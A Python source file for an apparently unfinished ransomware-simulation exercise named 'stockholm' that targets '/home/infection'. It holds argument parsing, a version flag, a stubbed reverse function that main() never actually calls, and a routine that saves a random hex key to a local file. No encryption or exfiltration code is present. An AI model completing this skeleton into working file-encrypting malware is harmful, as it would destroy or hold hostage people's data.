import argparse
import sys
import secrets
import logging
import os.path

PATH_FILE_KEY="./.key"
PATH_INFECTION_FOLDER="/home/infection"

def	parse_args():
	parser = argparse.ArgumentParser()
	group = parser.add_mutually_exclusive_group(required=False)
	group.add_argument("-v", "--version", action="store_true", dest="version",
					help="Show the version of the program")
	group.add_argument("-s", "--silent", action="store_true", dest="silent",
					help="Silent the terminal output of the program")
	group.add_argument("-r", "--reverse", dest="reverse", nargs=1, metavar="KEY",
					help="Reverse the malware infection using encryption key")
	args = parser.parse_args()
	return args

def	print_version():
	print("stockholm version 1.0")
#-------------------------------------------------------------------------------------------------#

def	reverse_stockholm():
	print("reverse stockholm")
	return 0

#-------------------------------------------------------------------------------------------------#
		
def	create_hexa_key_file(key, path):
	with open(path, 'w') as file:
		file.write(key)

def	generate_hexa_key():
	key = secrets.token_hex(32)
	return key

def	read_hexa_key(path):
	with open(path, 'r') as file:
		key = file.read()
	return key

def	get_key():
	print(os.path.isfile(PATH_FILE_KEY))
	if (os.path.isfile(PATH_FILE_KEY)):
		key = read_hexa_key(PATH_FILE_KEY)
	else:
		key = generate_hexa_key()
		create_hexa_key_file(key, PATH_FILE_KEY)
	return key

def	stockholm():
	print("stockholm")
	key = get_key()
	return 0

#-------------------------------------------------------------------------------------------------#

def	main():
	try:
		args = parse_args()
		if (args.version):
			print_version()
		elif (args.reverse):
			reverse_stockholm
		else:
			stockholm()

	except Exception as e:
		logging.error("An error occurred.", exc_info=True)	
		sys.exit(2)
	return 0

if __name__ == "__main__":
	main()
